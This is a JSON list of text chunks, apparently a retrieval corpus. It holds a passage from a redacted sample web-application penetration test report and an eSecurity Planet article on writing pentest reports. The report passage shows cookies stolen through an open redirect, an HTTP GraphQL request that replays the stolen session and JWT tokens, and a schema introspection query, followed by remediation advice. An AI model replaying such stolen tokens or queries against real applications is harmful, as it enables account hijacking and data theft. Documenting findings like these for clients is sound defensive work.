server. The following screenshot shows these cookies being received by the attacker's server: Figure 11 - Cookie Redirect To Attacker's Server The following shows the base64 decoded contents of the id_token excluding the binary signature: {\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"1e9f75eb5e6d6b7151411551a304613aIn0.{\"iss\":\"http:\\/\\/www.the company\",\"sub\":\"3402\",\"aud\":\"the company\",\"nonce\":null,\"exp\":1627524196,\"iat\":1627522396,\"email\":\"dev+assessor_purplesec.us@the company\",\"email_verified\":true,\"name\":\"Assessor\",\"given_name\":\"Assessor \",\"family_name\":\"Us\",\"zoneinfo\":\"UTC\",\"dio:roles\":[\"admin\"]}\\nAfter stealing these sensitive cookies, the attacker can now interact with the application's GraphQL endpoint. Note, the dio session cookie is not stolen from the victim in this attack. The following is a GraqhQL request using these two stolen cookies: POST /dashboard/api/project/graphql HTTP/2 Host: {URL} Cookie: dio=588a409f6514b4ba55471483afe819d1; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxM TU1MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsImF1ZCI6ImRpc2N1c3M uaW8iLCJub25jZSI6bnVsbCwiZXhwIjoxNjI3NTI0MTk2LCJpYXQiOjE2Mjc1MjIzOTZ9.A19CewVJSjf4cmSQ O23nqCbBjh7j7v4QN4DOn7wFaVTwmyJZMBsb9S4cDSnqpF5Msex_JbvGR2eOX0hGC8acMVZZDsvxLY Hy7a-npbhQl9iMVWYWl6Z3j36DYXrvVIs4rvNpO45Po7HgiCeDmp6RBT_0CZS8hQCsAYeOXLba2jY; id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWY3NWViNWU2ZDZiNzE1MTQxMTU1 MWEzMDQ2MTNhIn0.eyJpc3MiOiJodHRwOlwvXC93d3cuZGlzY3Vzcy5pbyIsInN1YiI6IjM0MDIiLCJhdWQi OiJkaXNjdXNzLmlvIiwibm9uY2UiOm51bGwsImV4cCI6MTYyNzUyNDE5NiwiaWF0IjoxNjI3NTIyMzk2LCJlb WFpbCI6ImRldittYXJjX3B1cnBsZXNlYy51c0BkaXNjdXNzLmlvIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsI m5hbWUiOiJNYXJjIFN3aXR6ZXIgVXMiLCJnaXZlbl9uYW1lIjoiTWFyYyBTd2l0emVyIiwiZmFtaWx5X25hbW UiOiJVcyIsInpvbmVpbmZvIjoiVVRDIiwiZGlvOnJvbGVzIjpbImFkbWluIl19.Uhhilbc5I8Y2X8uxXKsEgkhUe3w 0_I8iJLaL0mIxARjLXqMLn6EX6sYjw1wOzZd4EWGcWrNhNJba4oLdP_LqqbXSbYY_cGGFIfaYgcZB7qOb PQTx-QvYyp-SoAx5MNoBzgjbyL-7wxc3iw774F-tPakKOKvnNxWqO0j1GQkQ76w; [...] {\"query\":\"query ProjectsAndTeamsQuery($startAmount: Int, $afterCursor: String, $name: String) {\\n viewer {\\n identity\\n id\\n metadata\\n projects(first: $startAmount, after: $afterCursor, name: $name, orderBy: [{field: \\\"createdAt\\\", direction: DESC}]) {\\n pageInfo {\\n startCursor\\n endCursor\\n hasNextPage\\n __typename\\n }\\n totalCount\\n edges {\\n cursor\\n node {\\n data\\n externalId\\n href\\n longitudinalLink\\n isPublic\\n name\\n status\\n createdAt\\n ownerName\\n ownerEmail\\n projectType\\n __typename\\n }\\n __typename\\n }\\n __typename\\n }\\n __typename\\n }\\n}\\n\",\"variables\":{\"startAmount\":10,\"afterCursor\":null,\"name\":\"\"},\"operationName\":\"ProjectsAndTeamsQuer y\"}\\nDate: Thu, 29 Jul 2021 01:38:33 GMT Content-Type: application/json; charset=utf-8 X-Powered-By: Express Vary: Accept-Encoding {\"data\":{\"viewer\":{\"identity\":\"dev+assessor_purplesec.us@the company\",\"id\":\"e1bb4aac-52e1-401e-b0ec- ea5337047b53\",\"metadata\":null,\\nGraphQL Introspection Enabled Severity: Low The application enables GraphQL introspection. This enables users to query the GraphQL server for information about the underlying schema. This includes data like types, fields, queries, mutations, and even field-level descriptions. The following GraqhQL introspection query retrieves all underlying schema information: POST /dashboard/api/project/graphql HTTP/2 Host: app.the company Cookie <snip> Content-Type: application/json Authorization: Bearer Accept: */* Content-Length: 1765 Connection: close {\"query\":\"\\n query IntrospectionQuery {\\n __schema {\\n queryType { name }\\n mutationType { name }\\n subscriptionType { name }\\n types {\\n ...FullType\\n }\\n directives {\\n name\\n description\\n locations\\n args {\\n ...InputValue\\n }\\n }\\n }\\n }\\n\\n fragment FullType on __Type {\\n kind\\n name\\n description\\n fields(includeDeprecated: true) {\\n name\\n description\\n args {\\n ...InputValue\\n }\\n type {\\n ...TypeRef\\n }\\n isDeprecated\\n deprecationReason\\n }\\n inputFields {\\n ...InputValue\\n }\\n interfaces {\\n ...TypeRef\\n }\\n enumValues(includeDeprecated: true) {\\n name\\n description\\n isDeprecated\\n deprecationReason\\n }\\n possibleTypes {\\n ...TypeRef\\n }\\n }\\n\\n fragment InputValue on __InputValue {\\n name\\n description\\n type { ...TypeRef }\\n defaultValue\\n }\\n\\n fragment TypeRef on __Type {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n ofType {\\n kind\\n name\\n }\\n }\\n }\\n }\\n }\\n }\\n }\\n }\\n \",\"operationName\":\"IntrospectionQuer\\nDate: Thu, 29 Jul 2021 00:40:48 GMT Content-Type: application/json; charset=utf-8 Content-Length: 52851 X-Powered-By: Express Vary: Accept-Encoding {\"data\":{\"__schema\":{\"queryType\":{\"name\":\"Query\"},\"mutationType\":{\"name\":\"Mutation\"},\"subscriptionType\": null,\"types\":[{\"kind\":\"OBJECT\",\"name\":\"Query\",\"description\":\"\"\\nAppendix A - Findings & Recommendations 1. Stored Cross-Site Scripting An attacker can use Cross-Site-Scripting to insert malicious JavaScript into the application that could then be executed by another user. Consequences of this vulnerability include sensitive account hijacking, stolen credentials, and sensitive data could be exfiltrated. Recommendations: Cross-site scripting vulnerabilities can be remediated by",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 5
    }
  },
  {
    "text": "& Recommendations 1. Stored Cross-Site Scripting An attacker can use Cross-Site-Scripting to insert malicious JavaScript into the application that could then be executed by another user. Consequences of this vulnerability include sensitive account hijacking, stolen credentials, and sensitive data could be exfiltrated. Recommendations: Cross-site scripting vulnerabilities can be remediated by implemented two countermeasures – input validation and output encoding. These controls restrict impact by sanitizing the user's input to remove special characters and then encoding any remaining special characters before returning the content to the user. ● Input Validation: It is recommended that the user's input is sanitized by removing special characters <,>,',\",&,/ and JavaScript onEvent actions. ● Output Encoding: If special characters are required in the affected parameters, output encoding should be used to replace special characters with their HTML equivalent. (e.g., < becomes <) URL Locations: Instance 1 ● Redacted Instance 2 ● Redacted Instance 3 ● Redacted Instance 4 ● Redacted Additional Resources: ● OWASP Cross-site Scripting\\n2. Authorization Restriction Bypass An attacker can use these instances of broken access controls to discover sensitive application user information and data. This information can be used to further other types of attacks such as phishing, steal user data and cause reputational harm. Recommendations: Enforce authorization controls at a granular level. Ensure that application users only have access to perform actions they have the authorization to do. URL Locations Instance 1 ● Redacted Instance 2 ● Redacted Additional Resources: ● OWASP Broken Access Controls\\n3. Open Redirect An attacker can use this open redirect to steal sensitive cookies from application users. This can be used to further other types of attacks against the application or its users. Recommendations: Ensure that the application validates all URLs and only redirects to whitelisted domains. URL Location ● Redacted Additional Information: ● OWASP Open Redirect\\n4. GraphQL Introspection Enabled An attacker can leverage information returned in the GrapQL introspection query to further other types of attacks against the application. Recommendations: Ensure that GrapQL introspection is not enabled. Additional Information: ● OWASP GraphQL URL Location ● Redacted",
    "metadata": {
      "doc_id": "Web-Application-Penetration-Test-Sample-Report",
      "chunk_id": 6
    }
  },
  {
    "text": "___ Best Products Networks Cloud Threats Trends Endpoint Applications Compliance How to Write a Pentesting Report – With Checklist Written By Chad Kime PublishedOctober 31, 2023 eSecurity Planet content and product recommendations are editorially independent. We may make money when you click on links to our partners. Learn More. A penetration testing report discloses the vulnerabilities discovered during a penetration test to the client. A pentest report should also outline the vulnerability scans and simulated cybersecurity attacks the pentester used to probe for weaknesses in an organization’s overall security stack or specific systems, such as websites, applications, networks, and cloud infrastructure. To be truly useful, the report must be more than a simple list. Penetration test reports deliver the only tangible evidence of the pentest process and must deliver value for a broad range of readers and purposes. We explore the art of writing effective penetration testing reports in the sections below: How to Write a Great Pentest Report in 6 Steps The process of writing a great penetration test report is straightforward and can be covered in six key steps. Each step builds on the previous step to increase the quality of the information, the organization of the findings, and the usability of the report for stakeholders. × FlexJobs 1. Plan: Outlinin M g th a e k te e st in $ g 2 an 5 d / c H rea r t in O g r r e p M ort o te r m e p la F te r s o in m adv H anc o e m act e s both as a checLkEliAstR oNf i nMfoOrmRaEtion needed and as a repository for testing details.\\n2. Capture the technical details: Include notes, screenshots, and log files in the report, but to make documentation less disruptive, take video and narrate while conducting the pentest and take screenshots later. 3. Start with a rough draft: Begin with the most significant vulnerabilities, remediations, and overall results. Don’t worry about grammar, spelling, or complete sentences just yet. 4. Categorize and summarize key findings: Including criticality, vulnerability, system, and other important findings will help clients address issues by the level of risk they pose. 5. Revise the draft: Here’s where you focus on grammar, punctuation, and spelling to turn the content into plain, formal English, using non-technical language to help IT generalists and managers understand the risks. 6. Organize and proofread: Double check the information to eliminate errors, make the report easy to read, and to focus on the most important findings; move non-critical information to appendices. Although the process is simple enough, a quality report relies on the proper execution of this process and the inclusion of expected information. Also read: 7 Types of Penetration Testing: Guide to Pentest Methods & Types Penetration Testing Phases & Steps Explained 8 Common Sections to Include in a Pentest Report Every penetration test will be unique because each organization’s IT infrastructure, security stack, application code, website APIs, and vulnerabilities will be",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 0
    }
  },
  {
    "text": "information. Also read: 7 Types of Penetration Testing: Guide to Pentest Methods & Types Penetration Testing Phases & Steps Explained 8 Common Sections to Include in a Pentest Report Every penetration test will be unique because each organization’s IT infrastructure, security stack, application code, website APIs, and vulnerabilities will be a unique combination. However, the usability of the report depends on a writer’s ability to take the unique information and organize it into an expected format clearly and concisely. Some components of a pen test will be mandatory and must be present to provide value. Other components are nice to have because they help to improve the value of the report to stakeholders. The table below lists key information on eight common sections found in a typical pentest report, which we’ll go into in more detail below. Must / Nice to Order in the Order in the Level of Technical Section Level of Detail Have Report Drafting Info Executive Must Have 1 5 Low Low Summary Key Findings Must Have 2 4 High High Engagement Must Have 3 1 Low Low Summary Full Pen Test Must Have 4 2 Medium Medium Results Ratings & Risk Nice to Have 5 (appendix) Pre-draft n/a n/a Score Vulnerability Nice to Have 6 (appendix) Pre-draft Medium High Details Full Testing Nice to Have 7 (appendix) 3 High High Procedure Acronym Nice to Have 8 (appendix) Pre-draft n/a n/a Appendix Executive Summary Unless an organization is extremely technical and focused on security, the executives of the company that make resource allocation decisions will generally not understand most of the key findings of a pentest report. They may know they have a network, but not und×erstand how firewall rules protect that network. An executive summary must be simple, written in non-technical English, and to the point. The pentest writer must outline the key findings and high-level recommendations based on urgency and risk in a clear manner. https://www.esecurityplanet.com/networks/pentest-report/ 2/11\\nThe executive summary contains similar sections as the rest of the report, but in summary form: key findings, engagement summary, and overall penetration test results. Where possible, tables, charts, and graphics should be used to help quickly convey the findings by severity rating, items to address immediately, etc. The executive summary will generally be placed first in the pen test report, but written last once all of the other findings have been compiled and drafted. This is perhaps the most critical section of the report since the non-technical executives will likely determine future budgets for vulnerability correction and pentesting needs. Key Findings As this is the most important section for the technical team, it is placed as the second major section of the report. For every unique vulnerability identified, the pen test report writer will create a vulnerability report. All major vulnerabilities will be listed and detailed within the key findings section, with backup information that explains: Vulnerability name, standardized if possible Location of the vulnerability (list of systems, apps, etc.) Technique used to find the vulnerability Proof of",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 1
    }
  },
  {
    "text": "the pen test report writer will create a vulnerability report. All major vulnerabilities will be listed and detailed within the key findings section, with backup information that explains: Vulnerability name, standardized if possible Location of the vulnerability (list of systems, apps, etc.) Technique used to find the vulnerability Proof of concept, or an explanation of how the vulnerability was actually exploited or might have been exploited Likelihood of exploitation within the context of the organization and current trends Potential impact of the exploit directly to affected systems and indirectly if there are cascading effects to security or operations Overall risk assessment based on the nature of the vulnerability, ease of exploit, likelihood of exploit, and impact to the security stack and the overall business impact Recommendations, at a high level, to eliminate or mitigate the vulnerability While this appears second in the report, it will be one of the last sections drafted, as the Key Findings will be extracted from the Full Penetration Test Results. This section should contain only the high-risk vulnerabilities that need to be addressed. Low-risk vulnerabilities can be listed in a table or graph in this section but details on less important vulnerabilities should be left for the Penetration Test Results section. For clients that do not wish to use the penetration testing team for remediation, a high-level list of potential remediations should be used that explains possible solutions. A short recommendation such as “upgrade to version 10.x” will often be sufficient, but should also consider the context of the business environment. For example, a Windows XP machine maintained to run critical industrial equipment will be highly vulnerable and easily exploited. However, a recommendation to simply replace the old computer with a Windows 11 machine will be useless to the client that can only use Windows XP with that equipment. If the client has contracted for remediation or if this is an internal penetration testing report, recommendations may need to be quite involved and include prices for various options, timelines, and labor requirements. In some cases this might merit a separate Remediation Section. Engagement Summary The Engagement Summary can be the first section written because it comes from the statement of work. This section provides the context for the full penetration test results to follow and should outline both the original terms of engagement as well as any added requirements or limitations introduced in the course of the testing. This section should include: The scope of the testing, including IP addresses, systems, applications, exclusions, etc. The timeline, including dates of testing and times (if limited) for testing specific resources (example: only test the web application between 10pm and 11pm weekdays) Security defenses tested Assumptions Standards applied to testing, such as PTES standard for networks, OWASP for applications Compliance standards considered in the testing Full Pen Test Results The Full Pen Test Results section includes all details for all testing performed. Instead of focusing on vulnerabilities, this section will focus on a system-by-system and test-by-test review of",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 2
    }
  },
  {
    "text": "to testing, such as PTES standard for networks, OWASP for applications Compliance standards considered in the testing Full Pen Test Results The Full Pen Test Results section includes all details for all testing performed. Instead of focusing on vulnerabilities, this section will focus on a system-by-system and test-by-test review of the penetration testing process. × This section will discuss all attack methods attempted, including those that did not succeed. This expanded information will help reinforce the value of the parts of the security stack that performed well. https://www.esecurityplanet.com/networks/pentest-report/ 3/11\\nThis section can be very long as it will contain many details. It will typically be written as a draft or as notes early in the process and pen testers can put raw notes and screenshots here initially. If the section seems too long, some repetitive information for non-critical vulnerabilities can be moved to the appendix. For example, if a test was performed on all 1,500 endpoints in an organization and was blocked by the local firewall, it would be better to give this test a name and show that the endpoints passed the test. The details of how this test was performed can be moved to the Full Testing Procedure Details Appendix. Ratings & Risk Score Appendix When assigning priority to vulnerabilities, most penetration testing companies use a standardized method and score to determine a rating or risk score (numeric or qualitative). This section in the appendix should explain the system for the client and will usually be written in advance as a standardized section of all pen test reports. Vulnerability Details Appendix For each vulnerability found, the vulnerability can be explained in detail in this appendix. For example, most non-technical readers will not need to know the details of a cross-site scripting (XSS) vulnerability and many technical teams already know what they are. A full explanation may not be needed and therefore not included in the main sections of the pentest. However, some might find more details helpful and thus an appendix can be considered. Since many vulnerabilities are standardized, this section can also be prepared in advance for the most common vulnerabilities expected in the pentest. Full Testing Procedure Details Appendix As noted above, some testing will be repetitive and if they do not result in any discovered vulnerabilities the tests may not be interesting. However, some technical teams and some compliance auditors will want to see the methodology performed for each test and would appreciate a detailed appendix section. Acronym Appendix Security and IT use an enormous number of acronyms for technologies, vulnerabilities, protocols, etc. This appendix should explain each acronym used in the report to help eliminate any confusion and misunderstanding. For electronic copies, the acronyms used elsewhere in the report could use internal document links directly to this appendix. 3 Factors For Effective Penetration Test Reports For a pentest report to be effective, the results must be useful and provide value to all levels of readers, from executives to hands-on technicians. Pentest report writers must keep",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 3
    }
  },
  {
    "text": "elsewhere in the report could use internal document links directly to this appendix. 3 Factors For Effective Penetration Test Reports For a pentest report to be effective, the results must be useful and provide value to all levels of readers, from executives to hands-on technicians. Pentest report writers must keep these three factors in mind: Penetration test objectives that will vary at different levels of the organization Useful pentest results must be provided to extract value Tips and cautions to maximize the value of the report Penetration Test Objectives When authorizing a penetration test, an organization seeks to test their existing security controls for the systems authorized for testing. To deliver value on this investment, the penetration test writer must display the professionalism and competence of the testers clearly, both through the results of the test and the effective communication of the results. The penetration test report content must reflect the objectives of a diverse set of stakeholders: Executives and board members will want to see value for their investment and need a clear and understandable non-technical summary Technical teams will want clear, detailed, and actionable information that can be used to remedy discovered vulnerabilities Compliance and legal teams will need penetration test results that clearly show how the organization satisfies their compliance obligations Penetration testers, of course, want to demonstrate the quality of their skills and the satisfaction of the objectives of the testing × process Useful Pentest Results https://www.esecurityplanet.com/networks/pentest-report/ 4/11\\nPenetration test results will be used to determine resource allocations, remediation requirements, justify the acquisition of new cybersecurity tools, and determine the urgency of corrective action. Usable reports enable these goals efficiently and effectively. The key factors for usability are: clear presentation, client customization, and standardized ratings. Clear Presentation The pen test report writer must consider how to clearly present: Importance of Key Findings Overall findings Recommended Remediations Technical details Tested systems and methods used Often tables and graphics help for easy digestion of information and should be used frequently. Similarly, a pen test report should be written as clearly and concisely as possible for clear and quick understanding. Client Customization Although key findings will typically be listed by severity and overall findings will tend to be listed by system, a pen test report should be customized to the needs of the client. For example, in a large enterprise, there may be separate groups responsible for networks and for application development. This type of organization will likely want reports with completely segregated key findings and overall results organized by team responsibility. Standardized Ratings A simple good / bad rating will not convey enough information, but will be equally as useful as an overly complex matrix of, say, three categories of eight possible ratings levels. To be most usable, ratings need to mirror ratings systems familiar to the technical teams. The Common Weakness Enumeration (CWE) list developed by MITRE or scores based on the Common Vulnerability Scoring System (CVSS) will be familiar to all technical staff and are not too",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 4
    }
  },
  {
    "text": "of eight possible ratings levels. To be most usable, ratings need to mirror ratings systems familiar to the technical teams. The Common Weakness Enumeration (CWE) list developed by MITRE or scores based on the Common Vulnerability Scoring System (CVSS) will be familiar to all technical staff and are not too difficult to explain to executives. While these scores will lack the context of the business or active exploitation efforts, using standardized ratings as an initial base will typically be appreciated and easily understood. Tips and Cautions The main purpose of pentesting is to locate and remediate vulnerabilities before an attacker can exploit them. However, there are adjacent issues related to compliance and confidentiality that need to be considered for testing and reporting. Compliance Penetration Tests Generic pentests can check for vulnerabilities, but not necessarily touch on all elements to verify compliance. Some compliance standards require specific tests on specific systems and penetration testers should be told of such requirements in advance. Likewise the pen test report should reflect any compliance needs and specifically demonstrate the pen test results against specific compliance standards, either as the core of the penetration test results or within related appendices. The report should specifically demonstrate that the security for systems or processes protecting regulated data have been tested as required and the results of those required tests. Penetration Test Confidentiality Confidentiality is key to security. Yet a thorough penetration test result will include many confidential details (IP addresses, security tool settings, application code, etc.) that would seriously harm an organization if exposed. Confer with the client to determine the distribution needs for the report. If necessary, offer an edited or redacted version of the report that removes confidential information for broader distribution to non-privileged stakeholders (customers, vendors, affected executives, etc.). The client should also be consulted to determine the need for compliance-specific reports that contain only the pen test results for systems and assets touching the regulated data. If delivering reports electronically, consider encrypted or technologically restricted distribution (specific-user only permissions, etc.). Physical reports should be numbered and tracked. Pentest Report Checklist × The preparation of a penetration test report can be stressful and it will be easy to miss critical steps in the stress of writing and the technical details. To assist writers, we have created this Pentest Report Checklist: https://www.esecurityplanet.com/networks/pentest-report/ 5/11\\nPentest Report Checklist Complete? Step Item Plan Engagement Summary Draft Verify any compliance requirements (testing, Plan reporting) Verify any confidentiality requirements Plan (special drafts, special distribution, redacted versions, etc.) Plan Full Pen Test Outline* Plan Ratings & Risk Score Draft (optional) Plan Vulnerability Details Draft (optional) Plan Acronym Appendix Draft (optional) Tech Details Verify all required tests are performed Obtain supporting documentation for all Tech Details tests Rough Draft Draft initial full pentest results Move unnecessary testing information to Full Rough Draft Testing Procedure appendix Extract critical vulnerability findings to a draft Key Findings of the Key Findings section Key Findings Draft the Executive Summary Create graphics and tables to simplify Revise Draft",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 5
    }
  },
  {
    "text": "all Tech Details tests Rough Draft Draft initial full pentest results Move unnecessary testing information to Full Rough Draft Testing Procedure appendix Extract critical vulnerability findings to a draft Key Findings of the Key Findings section Key Findings Draft the Executive Summary Create graphics and tables to simplify Revise Draft communication of key information Double-check technical details with pentest Revise Draft technicians Confirm critical documentation present to illustrate tests performed, vulnerabilities Revise Draft found, risk assessments, and recommendations Revise Draft Convert all notes to formal text Convert technical jargon to clear, everyday Revise Draft English – particularly for the Executive Summary Proof Check grammar, spelling Check formatting, tables of contents, Proof footnotes, etc. *The full pentest outline prepares the document with all of the systems and tests to be performed. This outline can enable pentesters to place their documentation directly within this document, or for pentest report writers to use the outline as a checklist to avoid missing any technical details. 5 Examples of Pentest Reports There are almost as many different types of penetration test reports as there are systems to test. Fortunately, many penetration testing reports have been made public and can be found in a variety of resources. Two key repositories with hundreds of reports can be found at Pentest Reports and the public-pentesting-reports GitHub repository for JulioCesarFort. Most published reports focus on application security testing which can be published for open source projects or older applications without disclosing dangerous secrets. Penetration tests for network security require redaction or changing the information to hide IP addresses and security measures that likely continue to remain in place. × Of course, with hundreds of reports, it can be overwhelming to figure out where to start. Below, we list five key report types and aspects to examine for each: https://www.esecurityplanet.com/networks/pentest-report/ 6/11\\nApplication Code Audit: Kudelski Security code review provides an effective Issue Summary List and supporting technical details section. External IP Address Penetration Report: 7ASecurity pentest on an minivpn implementation provides quality findings and recommendations, but lacks a useful executive summary to determine the results at a glance. Internal Network Pentest: Rhino Security network assessment using open source nmap and nessus tools includes an attack narrative to help convey the significance and potential business impact of server message block (SMB) protocol issues. Industrial Control System Network: Redacted pentest on Next Generation Power, Electric, and Water on an ICS subnet demonstrates a good use of graphics and formatting to aid in communication. Social Engineering or Phishing Test Report: The Volkis phishing campaign report provides good process details, but lacks graphical representation of the findings to reinforce easy understanding of the executive summary. Pen Test Report FAQ What Is The Difference Between Internal and External Penetration Test Reports? The biggest differences between internal and external penetration testing reports will typically be the formality. Internal penetration testing will often be conducted by employees of an organization and external pen testing will be conducted by third parties contracted for the work. Third parties need to",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 6
    }
  },
  {
    "text": "and External Penetration Test Reports? The biggest differences between internal and external penetration testing reports will typically be the formality. Internal penetration testing will often be conducted by employees of an organization and external pen testing will be conducted by third parties contracted for the work. Third parties need to demonstrate more value and will often have more polished reports to demonstrate value. However, internal reports still need to accomplish all of the same goals and contain useful information for all readers so the key sections (executive summary, key findings, engagement summary, full pen test results) need to be present and the report must also be usable. What is the Difference Between Application, Website, Infrastructure, and Physical Penetration Test Reports? There is no real difference between different types of penetration test reports even for different penetration testing methods and the type of assets tested. The evidence and technical details for findings will be completely different, but the method, common sections, elements, and factors for success for different types of penetration test reports will be the same. Bottom Line: Reports Are the Final Pentesting Product Penetration testing plays an increasingly important role in assessing the health of security systems protecting organizations of all sizes. However, without an effective penetration test report, the investment in time and resources may be wasted, even with a quality penetration test assessment. Penetration testers must master the art of clearly presenting their results if they want their hard work to be appreciated. Further reading: Penetration Testing vs Vulnerability Scanning: What’s the Difference? 7 Best Penetration Testing Service Providers 7 Best Penetration Testing Tools & Software 8 Best Vulnerability Scanner Tools & Software Previous article Weekly Vulnerability Recap – October 30, 2023 – Citrix & Cisco Haunted by Vulnerabilities Next article Multi-Tenancy Cloud Security: Definition & Best Practices Chad Kime eSecurity Planet lead writer Chad Kime covers a variety of security, compliance, and risk topics. Before joining × the site, Chad studied electrical engineering at UCLA, earned an MBA from USC, managed 200+ ediscovery cases, and helped market a number of IT and cybersecurity products, then transitioned into technical writing policies and penetration test reports for MSPs and MSSPs. https://www.esecurityplanet.com/networks/pentest-report/ 7/11\\nSPONSORED CONTENT The Best Project Management Software for 2025 We reviewed the top project management tools, so you can make the right choice for your business. Read more on our Buyer's Guide to Project Management Software. By TechnologyAdvice Subscribe to Cybersecurity Insider Strengthen your organization’s IT security defenses by keeping abreast of the latest cybersecurity news, solutions, and best practices. Enter an email By registering, you agree to the Terms of Use and acknowledge the data practices outlined in the Privacy Policy. You may unsubscribe from these newsletters at any time. Subscribe Search Table of Contents × https://www.esecurityplanet.com/networks/pentest-report/ 8/11\\nHow to Write a Great Pentest Report in 6 Steps 8 Common Sections to Include in a Pentest Report 3 Factors For Effective Penetration Test Reports Pentest Report Checklist 5 Examples of Pentest Reports Pen Test Report FAQ Top",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 7
    }
  },
  {
    "text": "newsletters at any time. Subscribe Search Table of Contents × https://www.esecurityplanet.com/networks/pentest-report/ 8/11\\nHow to Write a Great Pentest Report in 6 Steps 8 Common Sections to Include in a Pentest Report 3 Factors For Effective Penetration Test Reports Pentest Report Checklist 5 Examples of Pentest Reports Pen Test Report FAQ Top Cybersecurity Companies 1 Ready1 2 Semperis See Full List Get the free newsletter Subscribe to Cybersecurity Insider for top news, trends & analysis Enter an email By signing up to receive our newsletter, you agree to our Terms of Use and Privacy Policy. Sign up Related Articles × https://www.esecurityplanet.com/networks/pentest-report/ 9/11\\nMicrosoft Defender vs Bitdefender: Compare Antivirus Software PRODUCTS May 27, 2025 Bitwarden vs Dashlane: Comparing Password Managers NETWORKS May 14, 2025 9 Best DDoS Protection Service Providers in 2025 PRODUCTS March 31, 2025 × https://www.esecurityplanet.com/networks/pentest-report/ 10/11\\neSecurity Planet is a leading resource for IT professionals at large enterprises who are actively researching cybersecurity vendors and latest trends. eSecurity Planet focuses on providing instruction for how to approach common security challenges, as well as informational deep-dives about advanced cybersecurity topics. Advertise with Us Terms & Conditions Privacy Policy Contact Us California – Do Not Sell My Info © 2025 TechnologyAdvice. All Rights Reserved. Our Brands TechnologyAdvice TechRepublic eWeek Datamation Channel Insider DZone We use cookies and other data collection technologies to provide the best experience for our customers. You may request that your data not be shared with third parties here: Do Not Sell My Data. × https://www.esecurityplanet.com/networks/pentest-report/ 11/11",
    "metadata": {
      "doc_id": "eSecurity Planet - How to Write a Pentesting Report",
      "chunk_id": 8
    }
  }
]